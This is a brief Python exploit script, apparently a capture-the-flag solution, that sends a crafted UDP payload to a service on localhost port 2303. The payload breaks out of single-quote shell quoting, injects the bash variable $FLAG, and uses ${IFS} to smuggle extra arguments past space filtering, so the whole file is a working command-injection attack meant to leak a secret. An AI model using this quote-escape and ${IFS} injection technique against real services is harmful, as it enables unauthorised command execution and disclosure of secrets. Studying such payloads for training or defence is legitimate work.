#!/usr/bin/python3

import socket

# Create a script injection on the comm payload

payload = b"'\"$FLAG\"\"${IFS}-q${IFS}2\"'" # this escapes the single quote, appends a quoted bash variable, and then ends the last single quote

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(('localhost', 2303))

s.send(payload)